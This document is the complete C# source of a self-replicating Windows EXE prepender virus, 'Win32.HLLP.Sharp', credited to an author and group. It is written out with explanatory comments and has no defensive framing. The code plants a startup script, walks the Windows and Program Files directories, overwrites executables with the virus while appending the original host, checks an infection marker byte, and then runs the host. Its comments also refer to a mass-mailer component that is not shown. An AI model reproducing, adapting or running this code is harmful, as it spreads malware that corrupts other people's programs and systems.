   /*
           Virus Name: Sharp
           Version: A
           Type: Win32 EXE Prepender
           Author: Gigabyte [Metaphase]
           Homepage: http://coderz.net/gigabyte
   */

   using System;
   using System.Windows.Forms;
   using System.IO;

   namespace Sharp
   {
       public class Sharp
       {
           static string virname = (string) Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Sharp").GetValue("");
           // We don't just wanna infect files with the C# code but with the whole thing, including the ASM mailer and framework checker, so that when an infected file is run
           // on a PC without the .NET framework, we don't get nasty errors. In the ASM code we write the name of the running file to the registry, so here, we read it.

           [STAThread]
           static void Main()
           {
               string StartupFolder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).FullName;
               FileInfo Startup = new FileInfo(StartupFolder+"\\Sharp.vbs");
               StreamWriter StartupMsg = Startup.CreateText(); // Just a little message on Windows startup
               StartupMsg.Write("MsgBox \"You're infected with Win32.HLLP.Sharp, written in C#, by Gigabyte/Metaphase\",64,\"Sharp\"");
               StartupMsg.Close();

               string windir = new DirectoryInfo(Environment.SystemDirectory).Parent.FullName;
               string progfiles = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)).FullName;
               string [] PFSubfolders = Directory.GetDirectories(progfiles,"*.*");

               FileSearch(windir);     // Infect EXE files in the Windows directory and
               FileSearch(PFSubfolders[11]);   // 3 subdirectories of the Program Files directory
               FileSearch(PFSubfolders[12]);
               FileSearch(PFSubfolders[13]);

               FileStream RunningFile = new FileStream(virname,FileMode.Open,FileAccess.Read);
               FileStream HostExec = new FileStream("temp.exe",FileMode.OpenOrCreate);
               byte [] ByteArray2 = new byte[(int)RunningFile.Length-12288];
               RunningFile.Seek(12288,SeekOrigin.Begin);
               RunningFile.Read(ByteArray2,0,(int)RunningFile.Length-12288);   // Make a copy of the original
               HostExec.Write(ByteArray2,0,(int)RunningFile.Length-12288); // hostfile in the running file

               long LengthHostExec = HostExec.Length;
               HostExec.Close();

               if(LengthHostExec > 0)  // If the copy of the hostfile is bigger than 0 (it may be 0 if we're not running
               {           // from an infected file but purely the virus), we execute it.
                   if(virname.EndsWith("MS02-010.exe") == false)   // We also don't wanna do this if the file is the attachment
                   {                       // that it used to mail itself.
                       System.Diagnostics.Process HostProcess = new System.Diagnostics.Process();
                       HostProcess.StartInfo.FileName = "temp.exe";
                       HostProcess.Start();
                   }
               }

               while(File.Exists("temp.exe"))
               {
                   try
                   {
                       File.Delete("temp.exe");    // We gotta delete the file we just created. However, as long as the file
                   }                   // is in use, we can't, so we keep trying until it isn't running anymore.
                   catch{}
               }

           }
           static void FileSearch(string DirectoryToCheck) // This is the FileSearch routine we're using to infect files.
           {
               string [] FoundFiles = Directory.GetFiles(DirectoryToCheck,"*.exe"); // Put the names of all EXE files in the folder in a string.
               int NumberOfFiles = FoundFiles.Length; // Get the length of the string

               for (int Counter = 0; Counter < NumberOfFiles; Counter++) // Loop through all found files
               {
                   string FoundFile = FoundFiles[Counter];
                   FileStream FileToInfect = new FileStream(FoundFile,FileMode.Open,FileAccess.Read); // Open file
                   FileToInfect.Seek(18,SeekOrigin.Begin);
                   int CheckInfected = FileToInfect.ReadByte(); // Read the 19th byte of the file, to see if it's infected yet
                   FileToInfect.Close();
                   if(CheckInfected != 103) // If not infected ...
                   {
                       try
                       {
                           File.SetAttributes(FoundFile, System.IO.FileAttributes.Normal); // set the file attributes to Normal,
                           File.Copy(FoundFile,"hostcopy.exe",true);           // make a copy of the found file,
                           File.Copy(virname,FoundFile,true);              // replace the found file with a copy of the virus,
                           FileStream HostFile = new FileStream("hostcopy.exe",FileMode.Open); // open the copy we just made of the found file,
                           FileStream VirFile = new FileStream(FoundFile,FileMode.Append);     // open the copy of the virus for appending,
                           byte [] ByteArray = new byte[(int)HostFile.Length];

                           HostFile.Read(ByteArray,0,(int)HostFile.Length); // read the copy of the found file,
                           VirFile.Write(ByteArray,0,(int)HostFile.Length); // append it to the copy of the virus,

                           HostFile.Close();                // and close both files
                           VirFile.Close();
                       }
                       catch{}
                   }
               }

               File.Delete("hostcopy.exe"); // After infecting all files, delete the copy we made of the last found file
           }
       }
   }
